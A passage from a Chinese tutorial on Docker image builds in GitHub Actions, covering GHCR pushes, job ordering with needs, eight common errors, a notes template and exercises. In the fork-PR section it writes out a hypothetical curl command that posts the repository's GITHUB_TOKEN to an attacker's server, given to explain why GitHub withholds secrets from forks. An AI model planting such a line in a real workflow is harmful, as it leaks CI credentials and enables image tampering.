**但你要知道 ACR 这条路存在。** 第 31 周真的部署到国内服务器时，你可能会换。

## 4.4 清理旧镜像（省存储）

**每次 push 都产生新 tag，GHCR 的存储会涨。**

**手动清理：**

```text
Packages → ci-lab → 版本列表 → 勾选 → Delete
```

**自动清理（了解即可）：**

```yaml
      - name: 删除除了最近 5 个之外的旧版本
        uses: actions/delete-package-versions@v5
        with:
          package-name: ci-lab
          package-type: container
          min-versions-to-keep: 5
          delete-only-untagged-versions: false
```

**⚠️ `min-versions-to-keep: 5` 可能删掉你"想留着回滚"的版本。**

**你一个人做产品，手动清就够了。** 一个月清一次，5 分钟。

**判断标准：**

```text
如果你从没回滚过，可以只留最近 5 个
如果你回过滚，至少留 10 个，并且确保它们不是同一天构建的
```

---

# 第 5 步：把 build 接进流水线（15 分钟）

## 5.1 现在三个 workflow 是并行的

**你的仓库现在有：**

```text
check.yml   → 语法 + lint
test.yml    → 单元测试
build.yml   → 构建 + 推镜像
```

**一次 push，三个同时开始。**

**问题：**

```text
check 挂了，build 照样在推镜像
→ 一个"检查不过"的版本进了仓库
→ 如果第 5 节课的部署是"镜像一推就部署"，坏代码就上线了
```

## 5.2 用 `needs` 让它有顺序

**`build.yml` 改成：**

```yaml
name: build

on:
  push:
    branches:
      - main
  workflow_dispatch:

permissions:
  contents: read
  packages: write

jobs:
  test:
    name: 先跑测试
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'npm'

      - run: npm ci
      - run: npm test -- --test-reporter=spec

  build:
    name: 构建并推送镜像
    needs: test
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4

      - name: 把仓库名转成小写
        id: repo
        run: echo "name=${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"

      - name: 算出短 sha
        id: vars
        run: echo "short=${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"

      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - uses: docker/setup-buildx-action@v3

      - uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: |
            ghcr.io/${{ steps.repo.outputs.name }}:sha-${{ steps.vars.outputs.short }}
            ghcr.io/${{ steps.repo.outputs.name }}:latest
          cache-from: type=gha
          cache-to: type=gha,scope=build
```

**逐段读关键改动：**

| 改动 | 意思 |
|---|---|
| `jobs.test` | 多了一个 job，名叫 test |
| `needs: test` | **build 必须等 test 成功才跑** |
| `cache-to: type=gha,scope=build` | 加 `scope`，避免和别的 workflow 抢同一个缓存 |

**⚠️ 这里有一个重复：`test.yml` 里也有一个 test job。**

**现在你有了两份"跑测试"的定义。**

**两个选择：**

```text
① 删掉 test.yml，全部合并进 build.yml
② 保留 test.yml（PR 时拦合并），build.yml 里也跑一遍（push 时保证顺序）
```

**我选 ②。** 因为：

```text
test.yml 的触发是 push + pull_request，它的作用是"卡住 PR"
build.yml 只在 push 到 main 时跑，它的作用是"上线前再验一次"
```

**代价是"推一次 main 会跑两遍测试"。** 多花 30 秒，换"部署前一定绿"，值得。

**⚠️ 一个更重要的点：`needs` 只保证"能跑的顺序"，不保证"不会重复构建"。**

**如果你 push 两次，会有两次 build 同时进行。** 第 7 节课用 `concurrency` 解决。

## 5.3 `needs` 的失败行为

**如果 test 挂了，build 会怎样：**

```text
Jobs
  test   ❌  25s
  build  ⊘   skipped
```

**`⊘ skipped` 是什么：** 被跳过，**不是"成功"，也不是"失败"**。

**它的意思是：**

```text
因为依赖的 job 没成功，所以这个 job 根本没开始
```

**在分支保护里，`skipped` 通常不算"通过"。** 这很重要 —— 它不会让你"偷偷跳过构建"。

**如果改 `needs` 让它无论如何都跑：**

```yaml
    if: always()
```

**⚠️ 这个写法很危险。**

```text
if: always() → 即使测试挂了，也照样构建推镜像
→ 一个测试不过的镜像进了仓库
→ 第 5 节课部署时"拉 latest 就部署"，坏代码上线
```

**唯一的合理用途：**

```text
你要"即使失败也上传测试报告"
```

**那应该写在 test job 里，不是写在 build job 上。**

## 5.4 一句话总结这一节

> **`needs` 的作用是"用流水线的顺序代替你的自觉"。**

**你不可能每次都记得"先等测试绿了再看构建"，但机器可以。**

---

# 第 6 步：故意犯八个错（25 分钟）

## 错误 1：没给 `packages: write`

**操作：** 把 `permissions` 改成只有 `contents: read`：

```yaml
permissions:
  contents: read
```

**会怎样：**

**构建能成功（本地层都建出来了），但推的时候：**

```text
ERROR: failed to solve: failed to push ghcr.io/yourname/ci-lab:sha-3f7a1c2: denied: permission_denied: write_package
```

**逐段读：**

| 部分 | 意思 |
|---|---|
| `failed to push` | 失败在"推"这一步 |
| `ghcr.io/yourname/ci-lab:sha-3f7a1c2` | 你要推的地址 |
| `denied` | 被拒绝 |
| `permission_denied: write_package` | **权限不足：不能写 package** |

**为什么：**

```text
GITHUB_TOKEN 的权限被 permissions 显式限定成"只读代码"
packages 没写 → 默认 none
→ 推送被拒
```

**怎么修：**

```yaml
permissions:
  contents: read
  packages: write
```

**⚠️ 一个容易忽略的细节：`permissions` 只要写了，就是"全量替换"，不是"追加"。**

```text
不写 permissions  → 用仓库默认（可能是 read/write）
写了 permissions  → 只给你列出来的那些，其它全是 none
```

**这就是为什么很多教程说"加了 permissions 之后 CI 反而挂了"—— 因为它把默认的 write 也收掉了。**

**`contents: read` 这一条不能少，否则 checkout 会失败。**

**checkout 失败长什么样：**

```text
Error: fatal: could not read Username for 'https://github.com': terminal prompts disabled
```

**看到这个，先检查 `permissions` 里有没有 `contents: read`。**

## 错误 2：镜像名有大写字母

**操作：** 去掉"转小写"那一步，直接用 `${{ github.repository }}`：

```yaml
      - uses: docker/build-push-action@v6
        with:
          tags: |
            ghcr.io/${{ github.repository }}:latest
```

**假设你的用户名是 `Keal-24`。**

**会怎样：**

```text
ERROR: failed to solve: invalid reference format: repository name (Keal-24/ci-lab) must be lowercase
```

**逐段读：**

| 部分 | 意思 |
|---|---|
| `invalid reference format` | 引用格式不合法 |
| `repository name (Keal-24/ci-lab)` | 它看到的名字 |
| `must be lowercase` | 必须全小写 |

**为什么：**

```text
Docker 镜像引用的语法规定：仓库名只能是小写字母、数字、分隔符
这是 Docker 的规范，不是 GHCR 的额外要求
```

**为什么 GitHub 用户名可以有大写：**

```text
GitHub 的用户名"显示时保留大小写"，但"比较时不区分大小写"
这是历史遗留
```

**怎么修：**

```yaml
      - name: 把仓库名转成小写
        id: repo
        run: echo "name=${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"
```

**用的时候：**

```yaml
          tags: ghcr.io/${{ steps.repo.outputs.name }}:latest
```

**⚠️ Windows 的 PowerShell 上 `${VAR,,}` 不工作。**

**但 runner 是 Ubuntu，默认 shell 是 bash，所以没问题。**

**如果你哪天换成 Windows runner，这行要改：**

```yaml
        shell: bash
        run: echo "name=${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"
```

**显式写 `shell: bash` 就是为这种情况准备的。**

## 错误 3：只用 `latest`

**操作：**

```yaml
          tags: ghcr.io/${{ steps.repo.outputs.name }}:latest
```

**会怎样：**

**它能成功，能部署，看起来一切正常。**

**直到你需要回滚的那一天。**

**模拟一次：**

```bash
# 第 1 天
git commit -m "v1" && git push      # latest 指向 v1
# 第 2 天
git commit -m "v2" && git push      # latest 指向 v2，v1 的 tag 没了

# 第 3 天：v2 出问题了
docker pull ghcr.io/owner/ci-lab:latest   # 拉到的还是 v2
```

**为什么这不是"会不会"的问题：**

```text
任何人做产品，平均一年至少回滚 2-3 次
第一次回滚时你就会发现"没有旧版本"
```

**怎么修：**

```yaml
          tags: |
            ghcr.io/${{ steps.repo.outputs.name }}:sha-${{ steps.vars.outputs.short }}
            ghcr.io/${{ steps.repo.outputs.name }}:latest
```

**为什么两个都要：**

```text
sha-xxx  → 给回滚用，永远不会被覆盖
latest   → 给"快速试一下最新版"用，也让人一眼看出"哪个是最新"
```

**⚠️ 一个陷阱：只推 `sha-xxx`，不推 `latest`。**

```text
部署脚本如果写 `docker pull ...:latest`
→ 拉到的永远是旧的那次 latest 推送
→ 你以为部署了，其实没变
```

**要么两个都推，要么部署脚本明确用 sha。**

**第 5 节课的做法是：部署脚本用 sha，`latest` 只是给人看的。**

## 错误 4：忘了 checkout

**操作：** 在 build job 里删掉 `actions/checkout@v4`。

**会怎样：**

```text
ERROR: failed to solve: failed to read dockerfile: open Dockerfile: no such file or directory
```

**逐段读：**

| 部分 | 意思 |
|---|---|
| `failed to read dockerfile` | 读不到 Dockerfile |
| `open Dockerfile: no such file or directory` | 文件不存在 |

**为什么：**

```text
runner 是空机器
context: . 指的是"当前目录"
当前目录里没有你的仓库
→ 没有 Dockerfile，也没有源码
```

**为什么这个错误容易误判：**

```text
你会去检查"Dockerfile 是不是叫 dockerfile（小写）"
会去检查"是不是放在子目录"
但真正的原因是"根本没下载代码"
```

**怎么快速判断：**

**在 build 前加一步：**

```yaml
      - name: 确认文件在
        run: |
          pwd
          ls -la
          test -f Dockerfile || { echo "没有 Dockerfile"; exit 1; }
```

**如果 `ls -la` 里只有 `work` 一个目录，就是没 checkout。**

**`test -f 文件` 是什么：** 文件存在返回 0，不存在返回 1。

**`|| { ...; exit 1; }` 是什么：** 左边失败就执行右边。**大括号里的内容要作为一个整体，所以用了分号结尾和空格。**

**这个"先确认文件在，再干活"的习惯，在写部署脚本时更重要（第 5 节课）。**

## 错误 5：在 fork 来的 PR 里推镜像

**操作：** 把 `on:` 加上 `pull_request`：

```yaml
on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main
```

**然后让一个朋友 fork 你的仓库，改点东西，开 PR。**

**会怎样：**

**`登录 GHCR` 那一步失败：**

```text
Error: Username and password required
```

**为什么：**

```text
从 fork 来的 PR，GitHub 不给 secrets，也不给写权限的 GITHUB_TOKEN
→ password 是空的
→ docker login 收到空密码 → 报 "Username and password required"
```

**为什么这是设计，不是 bug：**

```text
如果 fork 的 PR 能拿到你的 GITHUB_TOKEN（可写 packages）
陌生人只要改一行 workflow：
  run: curl -X POST https://他的服务器 -d "${{ secrets.GITHUB_TOKEN }}"
就能把你的令牌发走
→ 他可以用它推任意镜像、覆盖你的 latest
```

**所以 GitHub 的规则是：**

```text
pull_request 事件（来自 fork）：
  secrets        → 全部为空
  GITHUB_TOKEN   → 只读，不能写 packages
```

**怎么修（三步）：**

**第一步：给需要写权限的步骤加条件。**

```yaml
      - uses: docker/login-action@v3
        if: github.event_name != 'pull_request'
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
```

**第二步：构建也要分情况。**

```yaml
      - uses: docker/build-push-action@v6
        with:
          context: .
          push: ${{ github.event_name != 'pull_request' }}
          tags: |
            ghcr.io/${{ steps.repo.outputs.name }}:sha-${{ steps.vars.outputs.short }}
            ghcr.io/${{ steps.repo.outputs.name }}:latest
```

**`push: ${{ ... }}` 是什么：** 表达式的结果是 `"true"` 或 `"false"` 字符串，action 会当布尔解析。

**第三步：理解"PR 里只构建不推送"的价值。**

```text
它能验证"Dockerfile 还能构建成功"
这已经能挡住 80% 的"Dockerfile 改坏了"
而且不消耗存储、不覆盖 latest
```

**⚠️ `if:` 里不能直接用 `secrets`。**

```yaml
# ❌ 不生效（GitHub 不允许）
if: ${{ secrets.MY_TOKEN != '' }}
```

**正确写法是用 `env` 中转：**

```yaml
    env:
      HAS_TOKEN: ${{ secrets.MY_TOKEN != '' }}
    steps:
      - run: echo "有 token"
        if: env.HAS_TOKEN == 'true'
```

**第 209 节课会详细讲这个限制。**

## 错误 6：构建上下文太大

**操作：** 删掉 `.dockerignore`，然后 build。

**会怎样：**

**它会成功，但很慢。**

```text
[+] Building 128.4s (14/14) FINISHED
 => [internal] load build context                                 62.1s
 => => transferring context: 284.32MB                             61.9s
```

**逐行读：**

| 行 | 意思 |
|---|---|
| `load build context 62.1s` | 把文件送到构建引擎花了 62 秒 |
| `transferring context: 284.32MB` | **送了 284MB** |

**为什么：**

```text
docker build . 的 "." 就是"构建上下文"
Docker 会把整个目录（除了 .dockerignore 排除的）打包送给 daemon
```

**284MB 从哪来：**

```text
node_modules  → 约 60MB
.git          → 约 5MB
其它           → ...
```

**实际上你可能看到更大的数字，因为 `node_modules` 里有很多小文件，打包开销比大小更严重。**

**在 CI 里更糟：**

```text
runner 要把这 284MB 从工作目录传到 buildx 的容器里
每次构建都传一遍
→ 白烧 60 秒 × 每天 20 次
```

**怎么修：** 加 `.dockerignore`（第 1.3 节的内容）。

**验证效果：**

```bash
docker build -t ci-lab:local .
```

**应该看到：**

```text
 => [internal] load build context                                  0.1s
 => => transferring context: 2.14MB                                0.1s
```

**284MB → 2.14MB。**

**这就是 `.dockerignore` 的价值：它不是"优化"，它是"基本卫生"。**

**⚠️ 一个真实的坑：`.dockerignore` 里写了 `node_modules`，但你的 Dockerfile 里有 `COPY node_modules ./node_modules`。**

**那会报：**

```text
ERROR: failed to compute cache key: "/node_modules" not found: not found
```

**因为文件被挡住了，`COPY` 找不到。**

**正确做法是从别的阶段拷：**

```dockerfile
COPY --from=deps /app/node_modules ./node_modules
```

**`--from=` 不受 `.dockerignore` 影响**（因为它是从镜像里拷，不是从上下文拷）。

## 错误 7：tag 里用了分支名，带斜杠

**操作：**

```yaml
          tags: ghcr.io/${{ steps.repo.outputs.name }}:${{ github.ref_name }}
```

**然后在一个叫 `feature/login` 的分支上 push。**

**会怎样：**

```text
ERROR: failed to solve: invalid reference format
```

**为什么：**

```text
tag 的合法字符是：[A-Za-z0-9_.-]
斜杠 / 不合法
分支名 feature/login 带斜杠 → tag 里出现斜杠 → 格式错误
```

**为什么报错信息这么含糊：**

```text
它只说"格式不合法"，不说"因为有个斜杠"
```

**怎么修（两种）：**

**修法一：把斜杠换掉。**

```yaml
      - name: 把分支名转成合法的 tag
        id: branch
        run: echo "tag=$(echo '${{ github.ref_name }}' | tr '/' '-')" >> "$GITHUB_OUTPUT"
```

**`tr '/' '-'` 是什么：** 把斜杠替换成连字符。`feature/login` → `feature-login`。

**修法二：干脆不用分支名当 tag。**

**这也是我的建议：**

```text
分支名当 tag 的价值很低（你不知道那个分支是哪次提交）
sha 才是唯一可靠的标识
```

**所以：只用 `sha-xxx` 和 `latest`。**

**如果一定要标记分支，用 `branch-` 前缀 + 转义后的名字，并且接受"同名分支的多次提交会互相覆盖"这个事实。**

## 错误 8：`push: true` 但镜像是私有的，服务器拉不到

**操作：** 镜像推到 GHCR（私有），服务器上直接 `docker pull`。

**会怎样（在服务器上）：**

```text
Error response from daemon: Head "https://ghcr.io/v2/owner/ci-lab/manifests/latest": denied
```

**为什么：**

```text
私有 package 需要认证
服务器上没登录
```

**怎么修（两种，各有代价）：**

**修法一：在服务器上 `docker login`。**

```bash
echo "你的token" | docker login ghcr.io -u 你的用户名 --password-stdin
```

**代价：**

```text
① 要在服务器上存一个长期有效的 token
② 那个 token 有 read:packages 权限，泄露了别人能拉你的镜像
③ token 过期了，拉取会突然失败（而且你部署时才会发现）
```

**修法二：把 package 设成 public。**

```text
Packages → ci-lab → Settings → Change visibility → Public
```

**代价：**

```text
全世界都能拉你的镜像
→ 你的代码（打包在镜像里）等于公开了
```

**这是个真实的取舍，没有标准答案。**

**我的建议：**

```text
学习阶段：public（反正代码是练习代码）
真实产品：private + 服务器上一个只读 token + 在日历上记"半年轮换一次"
```

**⚠️ 无论哪种，都要先确认镜像里没有 `.env`。**

**验证方法：**

```bash
docker run --rm ghcr.io/owner/ci-lab:latest ls -la /app
docker run --rm ghcr.io/owner/ci-lab:latest cat /app/.env
```

**第二条如果输出内容而不是 `No such file or directory`，你的密钥已经在镜像里了。**

**这时候：**

```text
① 立刻吊销那个密钥
② 从 GHCR 删掉所有相关版本
③ 修 .dockerignore 和 Dockerfile，重新构建
```

---

# 第 7 步：写学习笔记（10 分钟）

**把下面的模板复制到 `02-笔记/NOTES.md`，然后填空。**

````markdown
# 第 207 节课学习笔记

## 一、`COPY . .` 的三个问题

1.
2.
3.

我在镜像里 `ls -la /app` 看到了什么：

## 二、`.dockerignore` 我写了哪些行

贴出来：

```text

```

哪一行最重要，为什么：

`!` 开头的是什么意思：

## 三、多阶段构建

| 阶段 | 名字 | 干什么 | 会不会进最终镜像 |
|---|---|---|---|
| 1 | | | |
| 2 | | | |

为什么先 `COPY package.json` 再 `COPY src`：

我实测的两次 build 耗时：

| 场景 | `COPY . .` 在前 | 分开拷 |
|---|---|---|
| 改一行源码 | | |
| 改依赖 | | |

## 四、镜像大小

| 版本 | 大小 |
|---|---|
| 最简单的 Dockerfile | |
| 多阶段 + alpine | |

省下来的主要是哪部分：

## 五、三个 tag

| tag | 谁用 | 会不会被覆盖 |
|---|---|---|
| `sha-xxxxxxx` | | |
| `latest` | | |
| 分支名 | | |

为什么"能回滚"的前提是 sha tag：

## 六、我的 `build.yml`

贴完整内容：

```yaml

```

`permissions` 里写了哪两行，各是干什么的：

`${GITHUB_REPOSITORY,,}` 是什么意思：

## 七、GHCR

我的镜像完整地址：

两个 tag 的 digest 一样吗：

我在本地 `docker pull` 成功了吗：

## 八、`needs` 的作用

`needs: test` 加在哪个 job 上：

如果 test 挂了，build 会显示什么状态：

`skipped` 算通过吗：

## 九、八个错误

| 错误 | 报错关键词 | 根本原因 |
|---|---|---|
| 没 `packages: write` | | |
| 大写镜像名 | | |
| 只用 latest | | |
| 忘 checkout | | |
| fork PR 推镜像 | | |
| 没有 `.dockerignore` | | |
| tag 里有斜杠 | | |
| 私有镜像服务器拉不到 | | |

## 十、国内网络

我遇到的最慢的一步是：

我的处理办法：

我决定不做什么，为什么：

## 十一、我还不懂的词

-
-

## 十二、完成检查

- [ ] 我的镜像里没有 `.env`、没有 `test/`、没有 `.git`
- [ ] 容器里 `whoami` 输出不是 root
- [ ] 我的镜像有 `sha-xxxxxxx` 和 `latest` 两个 tag
- [ ] 我在本地 `docker pull` 下来并跑通过
- [ ] CI 里 build job 配了 `needs`
- [ ] 我知道 `permissions` 是"全量替换"不是"追加"
- [ ] 我算过"改一行代码重建"要多久
````

---

# 第 8 步：课后练习

## 练习一：把镜像再瘦 30MB

**要求：**

1. 记录当前大小；
2. 试三个办法（挑两个做）：`npm ci --omit=dev`、去掉 `HEALTHCHECK`、用 `node:22-alpine` 换成更小的基础镜像；
3. 每次记大小。

**记录：** 表格：改动 / 大小 / 有没有副作用。

**思考题：** `--omit=dev` 会让 `npm test` 在镜像里跑不了，这是问题吗？

## 练习二：故意让 `needs` 生效一次

**要求：**

1. 让 test 失败（改错一个断言）；
2. push，看 build 的状态；
3. 记录 `⊘ skipped` 的样子；
4. 修好，看它变成绿。

**记录：** 两次的 job 列表截图或文字。

**思考题：** 如果给 build 加 `if: always()`，会发生什么？为什么危险？

## 练习三：用 `workflow_dispatch` 重推一次镜像

**要求：**

1. 不加任何 commit；
2. 手动触发 `build`；
3. 看 GHCR 上有没有新的 digest；
4. 对比 `sha-xxxxxxx` 的 digest 变了没。

**记录：** 变了还是没变？为什么？

**思考题：** 同一个 commit 构建两次，digest 不同，这会影响"回滚"吗？

## 练习四：算一次存储成本

**要求：**

1. 记下你的镜像大小；
2. 假设每天 push 5 次，保留 30 天；
3. 算总存储量；
4. 对照 GHCR 私有包的免费额度（500MB，以官网为准），算超出多少。

**记录：** 表格：单镜像大小 / 每天次数 / 保留天数 / 总量 / 超出额度。

**思考题：** 如果你的镜像是 500MB，一个月要花多少钱？（自己去查当时的单价）

## 练习五：验证"公开镜像"的边界

**要求：**

1. 把 package 设成 public；
2. 退出所有登录；
3. 在另一台机器（或让朋友）`docker pull`；
4. 拉下来 `ls -la /app`，看能看到什么。

**记录：** 别人能看到你的哪些文件？

**思考题：** 如果镜像里打包了前端代码，公开镜像等于公开源码吗？

---

# 第 9 步：最终验收

## A. 概念

- [ ] 我能说清"构建上下文"是什么，以及它为什么会影响速度
- [ ] 我知道 `latest` 会被覆盖，`sha-xxx` 不会
- [ ] 我知道为什么先拷 `package.json` 再拷源码
- [ ] 我知道 `permissions` 写了就是"全量替换"
- [ ] 我知道 fork 来的 PR 拿不到 secrets，也知道为什么

## B. 实操

- [ ] `Dockerfile` 是多阶段，最终镜像里没有 `test/`、`.git`、`.env`
- [ ] 容器里 `whoami` 是 `app` 不是 `root`
- [ ] `CMD` 用的是 JSON 数组形式
- [ ] `.dockerignore` 存在，构建上下文小于 5MB
- [ ] `.github/workflows/build.yml` 里 `permissions` 有 `contents: read` 和 `packages: write`
- [ ] 我在 GHCR 上看到了 `sha-xxxxxxx` 和 `latest` 两个 tag
- [ ] build job 有 `needs: test`

## C. 排错

- [ ] 我见过 `denied: permission_denied: write_package`
- [ ] 我见过 `repository name ... must be lowercase`
- [ ] 我见过 `failed to read dockerfile: ... no such file or directory`
- [ ] 我见过 `load build context` 花了几十秒（`.dockerignore` 缺失）
- [ ] 我知道 `invalid reference format` 可能是斜杠或大写导致的

## D. 交付

- [ ] 我从 GHCR 拉下镜像并 `curl /health` 成功
- [ ] 我的镜像地址写在笔记里，一个字不差
- [ ] 我没有任何密钥出现在镜像或 yml 里

## E. 笔记

- [ ] `NOTES.md` 填完
- [ ] 贴了自己的 `Dockerfile` 和 `build.yml`
- [ ] 记录了两次 build 的耗时对比

## 本节课要能说出口的一句话

> **能回滚的前提是"每个上线过的版本都有一个不会被覆盖的名字"；`latest` 会被覆盖，commit sha 不会 —— 这就是为什么镜像必须打 sha tag。**

---

# 附：常见问题速查

| 现象 | 原因 | 怎么做 |
|---|---|---|
| `denied: permission_denied: write_package` | 没有 `packages: write` | 在 `permissions` 里加上 |
| `could not read Username for 'https://github.com'` | 没有 `contents: read` | 加上；或删掉 `permissions` 用默认 |
| `repository name ... must be lowercase` | 用户名/仓库名有大写 | `${GITHUB_REPOSITORY,,}` 转小写 |
| `invalid reference format` | tag 里有 `/` 或空格 | 用 sha，不要把分支名直接当 tag |
| `failed to read dockerfile` | 没 checkout / 文件名不对 | 先 `ls -la` 确认 |
| `load build context` 很慢 | 没有 `.dockerignore` | 加 `.dockerignore` |
| `"/node_modules" not found` | `.dockerignore` 挡住了 `COPY` | 用 `COPY --from=deps` |
| `Username and password required` | fork PR 里 secrets 为空 | 加 `if: github.event_name != 'pull_request'` |
| `denied`（服务器上 pull） | 私有镜像没登录 | 服务器 `docker login` 或设 public |
| 容器里 `whoami` 是 root | `USER` 写在 `CMD` 后面 / 没写 | `USER app` 放在 `CMD` 之前 |
| `docker stop` 要等 10 秒 | `CMD` 不是数组形式，信号传不到 | `CMD ["node", "server.js"]` |
| 改一行代码要重建 45 秒 | `COPY . .` 在 `RUN npm ci` 之前 | 先拷 `package.json` |
| 两次构建 digest 不同 | 时间戳进了层 | 正常，不影响回滚 |
| GHCR 存储超了 | 旧 tag 太多 | 手动删旧版本 |
| `docker pull` 很慢 | 国际链路 | 重试；或换阿里云 ACR |
